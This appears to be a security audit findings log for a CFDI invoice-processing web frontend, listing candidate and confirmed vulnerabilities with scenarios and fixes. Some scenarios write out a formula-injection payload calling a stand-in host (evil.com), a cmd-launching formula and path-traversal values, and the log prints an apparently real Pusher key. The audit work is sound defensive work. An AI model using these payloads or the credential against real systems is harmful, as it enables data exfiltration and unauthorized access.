candidates.title: Clipboard formula injection via unsanitized CFDI UUID from untrusted XML
candidates.description: CopyButton writes cfdi.uuid (raw string from untrusted XML via getAttr without format validation) directly to navigator.clipboard.writeText() with no sanitization. An attacker-crafted XML can set the UUID to a spreadsheet formula (=cmd|' /C calc'!A0). When user copies and pastes into Excel, the formula executes.
candidates.exploit_scenario: Attacker crafts CFDI XML where TimbreFiscalDigital UUID = '=HYPERLINK("http://evil.com/"&A1)'. Victim uploads and clicks 'Copiar UUID'. Pastes into Excel, formula exfiltrates cell data to attacker server.
candidates.recommendation: Before writeText(), prefix value starting with =, +, -, @ with single quote. Validate UUID matches v4 regex.

candidates.title: NaN/Infinity propagation from untrusted XML renders garbage in monetary UI fields
candidates.description: getNumberAttr() rejects NaN but not Infinity. Values pass through analysis pipeline into .toFixed() calls. .toFixed() produces string representations ('Infinity', '-Infinity') for infinite values, displaying '$Infinity' in monetary UI fields.
candidates.exploit_scenario: Attacker crafts XML with Cantidad='1e500' (parsed as Infinity). ConceptDetailModal renders '${valorUnitario.toFixed(6)}' producing '$Infinity'. TaxAuditPanel renders 'Infinity%' rates.
candidates.recommendation: Add !Number.isFinite(parsed) guard to getNumberAttr() and getNum(). Defensive wrapper around .toFixed() calls.

candidates.title: Unsanitized XML tax code values interpolated into copy-able correction step instruction text
candidates.description: Correction step text built via template literals interpolating unsanitized XML values (invalidCode, concepto.descripcion). React escaping prevents HTML injection, but attacker-controlled narrative injected into audit tool guidance text.
candidates.exploit_scenario: Attacker sets concepto.descripcion='URGENTE: Transfiera a CLABE 0123456789'. Correction step shows this as legitimate audit instruction, enabling social engineering within trusted UI.
candidates.recommendation: Sanitize or truncate XML-derived strings used in instructional text. Flag values with control characters or excessive punctuation.
candidates.snippet: { text: `El código '${invalidCode}' no existe en el catálogo SAT ${catalog}.` },

candidates.title: Backend SAT enquiry error details rendered raw in InspectorHeader DOM without sanitization
candidates.description: satError string from FastAPI HTTPException.detail (via sat-enquiry-api-client → useSatEnquiry) rendered directly in visible text and title attribute. Only 'no configurado' gets filtered; all other backend exception messages pass raw into DOM.
candidates.exploit_scenario: Diverza API failure returns HTTPException with internal httpx error string. InspectorHeader renders raw error including connection details, revealing internal network/service info.
candidates.recommendation: Replace raw satError rendering with fixed message catalog. Backend should return structured error types.

candidates.title: RFC emisor string exposed in SAT enquiry error title tooltip attribute
candidates.description: When SAT enquiry fails for unconfigured RFC, visible text shows sanitized message but title attribute still holds full raw backend detail string including the RFC value, exposing it on hover.
candidates.exploit_scenario: User views CFDI from vendor with unconfigured RFC. Clicks 'Consultar SAT'. Hovering tooltip reveals 'RFC emisor no configurado: XAXX010101000', exposing vendor RFC in screen-sharing scenario.
candidates.recommendation: Strip RFC from error detail before setting as title attribute, or return detail without RFC from backend.

candidates.title: NaN/Infinity propagation through parseFloat in batch statistics, bypassing isNaN guard
candidates.description: parseFloat('Infinity') returns Infinity, which passes isNaN() (isNaN(Infinity) === false) and n > 0 check, causing Infinity to propagate into totalMonto, corrupting batch statistics and CSV exports.
candidates.exploit_scenario: Attacker crafts CFDI with Total='Infinity'. Backend returns cfdi.total=Infinity → BatchFileResult.total='Infinity' → parseFloat→Infinity → totalMonto=Infinity → '$InfinityM MXN' in batch summary UI.
candidates.recommendation: Add !isFinite(n) check: if (isNaN(n) || !isFinite(n) || n <= 0) return;
candidates.snippet:
const n = parseFloat(e.result.total);
      if (!isNaN(n) && n > 0) totalMonto += n;

candidates.title: Untrusted XML numeric values injected into diagnostic display strings via toFixed() without finite check
candidates.description: summarizeDifference() interpolates xmlValue/calcValue (from getNum()→Number() on attacker XML attrs) into diagnostic text via .toFixed(2). NaN.toFixed(2) = 'NaN', producing corrupted strings like 'XML NaN vs cálculo 100.00' in findings UI.
candidates.exploit_scenario: Attacker sets Importe='NaN' in CFDI Concepto. summarizeDifference(NaN, calc) produces 'XML NaN vs cálculo 100.00' → finding.summary → rendered in FindingsSidebar as corrupted diagnostic.
candidates.recommendation: Validate with isFinite() before interpolation; use fallback 'inválido' for non-finite values.

candidates.title: Unvalidated backend JSON deserialization into typed interfaces via unchecked 'as' casts
candidates.description: tryReadContractualPayload() casts raw JSON to ApiAnalyzeResponse with 'as' — no runtime validation. Missing properties, wrong types, or extra keys pass silently. Same pattern at lines 59, 71-77, 84-87, 96-97. Malformed payload can cause TypeError crashes downstream.
candidates.exploit_scenario: Backend returns JSON with meta as string instead of object. payload.meta.provider access crashes with TypeError. No fallback handles this case.
candidates.recommendation: Add runtime validation layer (Zod, io-ts, or manual type guards) after JSON deserialization.

candidates.title: Full CFDI XML content rendered in DOM exposing all sensitive fiscal data without masking
candidates.description: sourceFile.text() reads entire CFDI XML into JS string, tokenizeXml() renders every attribute value (RFCs, UUIDs, amounts, concepts) into DOM as syntax-highlighted spans. No data masking, redaction, or access control. Full XML in browser memory via xmlContent state and React DevTools.
candidates.exploit_scenario: Attacker with DOM access (XSS on co-hosted page, malicious browser extension) reads all CFDI fiscal data from DOM nodes. React DevTools exposes full xmlContent state.
candidates.recommendation: Mask sensitive attribute values before rendering, render only snippet fragment relevant to finding, or validate viewer authorization.

candidates.title: Emisores API client performs all CRUD operations without authentication headers
candidates.description: request() sends fetch to /api/emisores with only Content-Type header, no Authorization. listEmisores() returns all emisores including credential_id. createEmisor(), updateEmisor(), deleteEmisor() perform write operations with no auth mechanism.
candidates.exploit_scenario: Any user who can reach the frontend can list all registered emisores and credential_ids, create new emisor records, overwrite existing ones, or delete any emisor — no session, token, or identity check.
candidates.recommendation: Add Authorization header to request(). Implement server-side auth middleware on /api/emisores endpoints. Treat credential_id as sensitive.

candidates.title: Modified CFDI XML downloadable via onAcceptChange without access control verification
candidates.description: onAcceptChange passes string-manipulated XML (using untrusted fragment/declared/expected values) to parent as modifiedXml. App.tsx creates Blob and triggers download with no auth check, session validation, or re-authentication. 'Descargar corregido' button appears whenever modifiedXml is set.
candidates.exploit_scenario: User applies correction to finding, 'Descargar corregido' button appears. Clicking downloads complete modified CFDI XML immediately. If session stale or page left on shared device, unauthorized user downloads fiscal document.
candidates.recommendation: Add authorization check before download. Require re-authentication or session validation. Implement server-side endpoint for modified XML with access control.

candidates.title: CSV Formula Injection: escapeCsv escapes only double quotes, no formula character guard in all four export paths
candidates.description: escapeCsv wraps values in double quotes but does NOT prefix formula-starting characters (=, +, -, @). Attacker-controlled CFDI XML fields (emisor name, concept description, UUID, tax names) flow through all four CSV export functions into downloadable files. Opening in Excel executes formulas.
candidates.exploit_scenario: Attacker sets Emisor Nombre='=HYPERLINK("http://evil.com/"&A1)'. Victim exports CSV from extraction workspace, opens in Excel. Formula exfiltrates cell data to attacker server.
candidates.recommendation: Prefix values starting with =, +, -, @ with single quote: /^[=+\-@]/.test(s) ? "'" + s : s. Apply before double-quote wrapping.

candidates.title: Mass fiscal data exported to downloads folder with no access control or user confirmation
candidates.description: exportCurrentTable() creates CSV with entire extract grid dataset (sorted row model — not just current page) and triggers immediate browser download via programmatic <a> click with no access control, auth guard, or user confirmation. Single click exfiltrates all loaded fiscal data (UUIDs, RFCs, amounts, payments) to Downloads folder.
candidates.exploit_scenario: Attacker with brief physical access clicks 'Exportar' button in inspector header. CSV with all rows saved immediately to Downloads — no prompt, no confirmation, no audit trail.
candidates.recommendation: Add confirmation dialog before download. Show export row count. Require re-authentication for datasets exceeding threshold.

candidates.title: Export button label and scope misleading — all rows exported regardless of pagination
candidates.description: When selectedRowCount is 0, export uses getSortedRowModel() returning ENTIRE dataset across all pages — not just visible rows. Export button shows no row count, no scope indication, and no warning that pagination is ignored. User may inadvertently export thousands of records.
candidates.exploit_scenario: User views page 1 of 20 (100 rows/page), clicks 'Exportar' assuming current page only. All 2000 rows downloaded — including rows user may not have reviewed.
candidates.recommendation: Show export count in tooltip. Offer 'Exportar página actual' vs 'Exportar todo' as separate actions.

candidates.title: URL query parameter `batch` flows unsanitized into API URL and Pusher channel name construction
candidates.description: ?batch= query parameter read without validation, passed as restoreBatchId to ConversionMasivaPage, then used via string concatenation in pdf-download.ts fetch() URLs and Pusher channel subscriptions. Attacker can inject path traversal sequences (../../) into batch param.
candidates.exploit_scenario: Attacker crafts URL ?batch=../../admin/delete. Victim visits. Frontend constructs fetch('/api/cfdi/pdf/batch/../../admin/delete/status') → browser resolves to /api/admin/delete/status, hitting unintended endpoint.
candidates.recommendation: Validate batch param against strict format (UUID/alphanumeric). Reject/replace path traversal characters. Use encodeURIComponent at sinks.

candidates.title: Content-Disposition filename extracted without sanitization used as download filename
candidates.description: Content-Disposition header parsed with naive regex /filename=(.+)/, extracted value used directly as a.download without path sanitization. Does not handle quoted filenames, RFC 5987 encoding, or strip traversal characters.
candidates.exploit_scenario: Compromised backend returns Content-Disposition: attachment; filename=../../../.ssh/authorized_keys. Modern browsers strip separators, but older browsers may save outside download directory.
candidates.recommendation: Sanitize extracted filename: strip path separators and null bytes. Extract basename only. Handle quoted and RFC 5987 filenames.

candidates.title: Server-provided jobId interpolated into fetch/EventSource URLs without validation or encoding
candidates.description: jobId from /api/cfdi/pdf/start response used directly in new EventSource() and fetch() URL template literals without validation or encodeURIComponent(). Compromised backend returning malicious jobId could redirect requests to unintended paths.
candidates.exploit_scenario: Compromised backend returns jobId='../../admin/export'. Frontend calls EventSource('/api/cfdi/pdf/../../admin/export/progress') → resolves to /api/admin/export/progress, exfiltrating data or triggering unintended actions.
candidates.recommendation: Validate jobId against expected format (UUID). Use encodeURIComponent(jobId) in URL construction. Defense in depth.

candidates.title: VITE environment variables logged to browser console at application startup
candidates.description: main.tsx logs entire import.meta.env object to console on every page load, exposing all VITE_-prefixed variables including VITE_API_BASE_URL (Cloud Run production endpoint) and VITE_PUSHER_KEY. Any future sensitive VITE_ variable would be exposed automatically.
candidates.exploit_scenario: Attacker opens DevTools on production deployment. Console shows full VITE env including Cloud Run URL, enabling direct targeting of backend API bypassing frontend routing. If VITE_SENTRY_DSN added, DSN with ingest endpoint fully exposed.
candidates.recommendation: Remove console.log or gate behind import.meta.env.DEV. Only log non-sensitive variables individually.
candidates.snippet: console.log("📡 TODAS LAS VARIABLES VISIBLES POR VITE:", (import.meta as any).env);

candidates.title: Batch share URL (?batch=<id>) used as sole authorization token with no access control
candidates.description: ?batch= query param read synchronously and used as view router AND sole credential to restore batch processing (passed as restoreBatchId to ConversionMasivaPage). Zero authentication: no login, no session token, no CORS validation, no ownership check. Anyone with batchId URL accesses all batch progress, downloads individual PDFs and consolidated ZIP containing fiscal data.
candidates.exploit_scenario: User A uploads 500 XMLs, clicks 'Copiar link', accidentally pastes in public channel. Attacker B opens URL → App routes to conversion-masiva → connects to Pusher pdf-batch-xxx → receives real-time progress of all 500 documents → downloads every PDF and consolidated ZIP — all without login.
candidates.recommendation: Add authentication layer. Require server-side ownership token in addition to batchId. Batch share URL must include cryptographic access token verified server-side.

candidates.title: SSE EventSource URL constructed without authentication or session validation
candidates.description: handleDownloadPdf constructs EventSource URL `/api/cfdi/pdf/${jobId}/progress` with no auth token, API key, or session cookie. Backend endpoint (pdf.py:430) has no auth middleware. Anyone knowing a valid jobId can connect to SSE stream and receive real-time PDF progress events.
candidates.exploit_scenario: Attacker captures jobId from network tab of shared/previous machine. From any machine without auth, opens EventSource with captured jobId → receives real-time pipeline events → when complete, calls download endpoint → receives PDF with fiscal data.
candidates.recommendation: Add auth middleware to PDF progress/download endpoints (backend). Include session token/API key in SSE URL. Validate server-side ownership.

candidates.title: React DevTools enabled in production exposes full App state with fiscal data
candidates.description: App component stores sensitive fiscal data (cfdi.uuid, emisor, receptor, total, ingresoRows, pagoRows, findings, modifiedXml) in React state without any DevTools guard. No disableReactDevTools() call. In production, anyone with DevTools can inspect full component tree and read all fiscal data.
candidates.exploit_scenario: User processes CFDI on shared computer, steps away. Unauthorized person presses F12, navigates to React Components tab, browses App state → reads UUIDs, RFCs, invoice totals, concept-level line items with tax details — no password or re-auth.
candidates.recommendation: Call disableReactDevTools() in production. Override window.__REACT_DEVTOOLS_GLOBAL_HOOK__ when import.meta.env.PROD.

candidates.title: Hardcoded Sentry DSN fallback in main.tsx sends telemetry to fixed production project
candidates.description: Sentry.init with hardcoded DSN string as fallback when VITE_SENTRY_DSN unset. Routes error telemetry from every deployment omitting the env var to a single production Sentry project controlled by original developer, without deployer's knowledge.
candidates.exploit_scenario: Third party forks and deploys without VITE_SENTRY_DSN. All client-side errors, stack traces, URLs, breadcrumbs silently sent to original developer's Sentry project.
candidates.recommendation: Remove hardcoded fallback. Require VITE_SENTRY_DSN explicitly. Use placeholder that fails loudly rather than silently routing to foreign project.

candidates.title: Full backend error responses leaked through batch API client to user-facing UI
candidates.description: When batch analyze API returns non-OK response, full response body text is embedded into BatchFileResult error field and displayed in UI (BatchAnalysisPage.tsx:949 and via alert() in ConversionMasivaPage.tsx:396). Backend exceptions including tracebacks propagate to frontend.
candidates.exploit_scenario: Attacker sends malformed XML triggering backend error. Response text with internal paths/exception types captured verbatim, displayed in batch results table and alert(), revealing internal implementation details.
candidates.recommendation: Sanitize error messages from backend before surfacing in UI. Return generic user-facing message, log full error server-side only.

candidates.title: localStorage batchId injected unsanitized into Pusher channel subscription name
candidates.description: batchId from localStorage (via ConversionMasivaPage restore) interpolated directly into pusher.subscribe('pdf-batch-' + batchId) without validation. Polluted localStorage could inject confusing channel names or connect to attacker-controlled channels.
candidates.exploit_scenario: Attacker with localStorage write access (XSS, browser extension) overwrites 'cfdi-active-batch' with {"batchId":"attacker-channel"}. Victim's next visit subscribes to attacker-controlled Pusher channel instead of legitimate one.
candidates.recommendation: Validate batchId against safe pattern (/^[a-zA-Z0-9_-]+$/) before using in Pusher channel names. Apply validation at localStorage recovery.

candidates.title: Console.log leaks API base URL on every batch operation in production
candidates.description: resolveApiBaseUrl() unconditionally console.logs the API base URL on every call. Called from 7 batch functions (startZipConversion, watchBatchProgress, waitForBatchJob, getBatchDownloadUrl, fetchReadyFileIds, fetchPdfDownloadUrl, fetchZipEstimatedSize), leaking Cloud Run URL to browser console.
candidates.exploit_scenario: Attacker with console access observes Cloud Run URL logged repeatedly during batch operations, enabling targeted infrastructure reconnaissance.
candidates.recommendation: Remove console.log or gate behind import.meta.env.DEV.
candidates.snippet: console.log("📡 URL BASE PARA ZIP DETECTADA EN PDF-DOWNLOAD:", url);

candidates.title: No integrity verification (hash/checksum) for downloaded PDF blobs and batch ZIPs
candidates.description: downloadWithProgress() fetches content and assembles Blob from streamed chunks without any cryptographic integrity verification. No checksum, hash, or ETag verification client-side. Backend compromise or cache poisoning would go undetected.
candidates.exploit_scenario: Compromised backend serves tampered PDF blob. Client assembles and downloads with no hash verification. User opens maliciously modified fiscal document without warning.
candidates.recommendation: Include SHA-256 hash in /status or /download-url response. Validate hash client-side after blob assembly; refuse download on mismatch.

confirmed_existing.title: Error details leaked in HTTP responses
confirmed_existing.evidence: End-to-end pattern confirmed at all 5 component levels: (1) InspectorHeader.tsx:210 — satError raw in DOM; (2) cfdi-api-client.ts:78 — errorData.detail in Error; (3) App.tsx:253,279 — b.detail/b.message from PDF endpoints set as pdfError; (4) batch-api-client.ts:56 — full response body in BatchFileResult error; (5) useCfdiExports.ts:174 — error object in console.error. Every layer from API client to DOM confirms raw backend errors visible to users.
confirmed_existing.note: Systemic across all 5 components. No component implements end-to-end sanitization of backend error details before user visibility.

confirmed_existing.title: Excel/CSV formula injection
confirmed_existing.evidence: Three distinct vectors: (1) ResolutionPanel.tsx:18 — CopyButton writes untrusted XML UUID to clipboard, paste into Excel executes formula; (2) useCfdiExports.ts:15 — escapeCsv lacks formula guard in all 4 export paths; (3) useFindingContexts.ts:190 — correction step text with untrusted codes written to clipboard. The escapeCsv function and clipboard paths are the primary sinks.
confirmed_existing.note: Finding #10 originally documented in 08-auditoria-actual.md severity MEDIUM, esta confirmada con evidencia concreta adicional en 3 componentes distintos.

confirmed_existing.title: Pusher public channels — sin auth
confirmed_existing.evidence: pdf-download.ts:412 — public channel 'pdf-batch-' + batchId, no authEndpoint/authorizer. BatchAnalysisPage.tsx:808 — public channel 'batch_' + batchId. Both channels gate access only on knowledge of batchId, which is exposed via share URLs, localStorage, and Pusher signals.
confirmed_existing.note: Full finding confirmed. No migration to private channels or auth endpoints implemented.

confirmed_existing.title: Pusher key hardcodeada en prod
confirmed_existing.evidence: pdf-download.ts:308 — 'ec582a031473e2da1654' as fallback with 'pragma: allowlist secret'. Same key in frontend/.env.production:4, frontend/.env.local:4, backend/.env:6. BatchAnalysisPage.tsx:801 uses different placeholder fallback showing inconsistent secret management.
confirmed_existing.note: Hardcoded in 4 separate files. pragma: allowlist secret actively suppresses detect-secrets for real production credential.

confirmed_existing.title: Batch status endpoint sin autenticación
confirmed_existing.evidence: batch.py:183 — get_batch_status zero auth deps. pdf.py:419 — batch_status zero auth. pdf.py:453 — ready-files zero auth. pdf.py:488 — download_batch_zip (complete ZIP) zero auth. Frontend calls all these without Authorization headers. BatchId is sole access control.
confirmed_existing.note: pdf.py:488 (download_batch_zip) is the highest-impact endpoint — streams complete ZIP of all batch PDFs with only batchId as credential.

confirmed_existing.title: Pusher public channel broadcasts sensitive fiscal data without authentication
confirmed_existing.evidence: batch.py:307 — pusher_client.trigger('batch_{batch_id}', 'file_processed', parsed_result) with full RFCs, totals, findings on public channel. BatchAnalysisPage.tsx:812 — channel.bind receives this data unsanitized.
confirmed_existing.note: Every file_processed event leaks RFC both emisor/receptor, nombre_emisor, total, and findings_count over unauthenticated Pusher channel.

confirmed_existing.title: Batch share URL grants unauthenticated access to batch progress and PDF downloads
confirmed_existing.evidence: App.tsx:69 — ?batch= param as view router. App.tsx:106 — same ID as restoreBatchId for ConversionMasivaPage. ConversionMasivaPage.tsx:61-63 — share URL construction. ConversionMasivaPage.tsx:278-288 — immediate fetchReadyFileIds() and listenToBatch() on restore, no ownership check.
confirmed_existing.note: batchId serves triple duty: URL router, view selector, and authorization token — all without server-side ownership verification. Confirmed across both components.

confirmed_existing.title: localStorage batchId used for API URL construction without sanitization
confirmed_existing.evidence: ConversionMasivaPage.tsx:291-315 — ACTIVE_BATCH_KEY from localStorage, parsed without schema validation, batchId used directly in fetchReadyFileIds and listenToBatch. pdf-download.ts:310,437,457,463,484 — all batch URL construction via string concatenation with no validation or encodeURIComponent.
confirmed_existing.note: Path traversal sequences (../../) in batchId flow through 6 different URL construction sinks in pdf-download.ts without any validation layer.

confirmed_existing.title: Pusher channel event data consumed as 'any' type without schema validation
confirmed_existing.evidence: pdf-download.ts:421 — channel.bind('signal', ...) now takes 0 params (hint-only pattern). But snapshot data fetched at line 357 uses as BatchProgressPayload cast with zero runtime validation. Partially mitigated from original any-typed Pusher payload.
confirmed_existing.note: Pusher event data path redesigned to hint-only, but HTTP response snapshot still uses unvalidated type assertion.

confirmed_existing.title: SSE event data JSON.parsed without schema validation
confirmed_existing.evidence: pdf-download.ts:167 — JSON.parse(raw) as { status: string; error?: string } in waitForPdfJob. pdf-download.ts:444 — JSON.parse(raw) as BatchProgressPayload in waitForBatchJob. Both compile-time assertions only, zero runtime validation before field access.
confirmed_existing.note: waitForBatchJob propagates unvalidated data to onProgress() → UI state (counters, percentages, errors). Malformed SSE could corrupt UI.

confirmed_existing.title: GCS signed URL access_token in query string combined with CORS wildcard
confirmed_existing.evidence: pdf.py:662-668 — upload_url with access_token=credentials.token in query string. pdf.py:701 — download signed URL same pattern. Frontend fetchPdfDownloadUrl and downloadWithProgress fetch these URLs, exposing access_token in browser Network tab.
confirmed_existing.note: access_token visible in browser history, server logs, Network tab. Combined with GCS CORS * amplifies exfiltration risk.

confirmed_existing.title: CFDI UUID and tax correction values persist on system clipboard without clearing
confirmed_existing.evidence: ResolutionPanel.tsx:17-21 — CopyButton.handleCopy() writes to clipboard but never clears. 1.8s 'copied' visual state only. 7+ correction step copyValue paths across useFindingContexts.ts all write without clearing. No beforeunload/visibilitychange listener.
confirmed_existing.note: UUID, importeCalculado, finding.expected, invalidCode all persist on system clipboard indefinitely. Confirmed across component scope.

confirmed_existing.title: CSV formula injection via escapeCsv without formula character guard
confirmed_existing.evidence: useCfdiExports.ts:15-17 — escapeCsv defined with only double-quote escaping. Lines 110, 137, 166, 195 all feed untrusted CFDI XML string fields through this unsanitized function into downloadable CSVs.
confirmed_existing.note: 45+ string fields from CFDIIngresoRow/CFDIPagoRow originate from attacker-controlled CFDI XML attributes. All flow through escapeCsv without formula prefixing.

confirmed_existing.title: Sensitive CFDI financial data fully exposed in React DevTools via useState
confirmed_existing.evidence: App.tsx:85 — cfdi (CFDIData with uuid, emisor, receptor, total, findings). useExtractGridState.ts:47-57 — 8 useState hooks with full row data. useCfdiAnalysis.ts:40-41 — full CFDIData, ingresoRows, pagoRows. No disableReactDevTools anywhere in codebase.
confirmed_existing.note: Inherent to React architecture but no mitigation attempted. Combined with B8-SHELL-AUTH-04 (no DevTools guard) makes fiscal data trivially inspectable.

confirmed_existing.title: pragma: allowlist secret suppresses real hardcoded Pusher key in source
confirmed_existing.evidence: pdf-download.ts:308 — Exact line with pragma: allowlist secret comment suppressing detection of 'ec582a031473e2da1654'. Key matches Pusher app ID 2174770 in backend/.env:5-6. Not a false positive — real production key with active suppression directive.
confirmed_existing.note: The pragma instructs detect-secrets to skip this line, enabling the hardcoded production credential to evade CI/CD scanning.
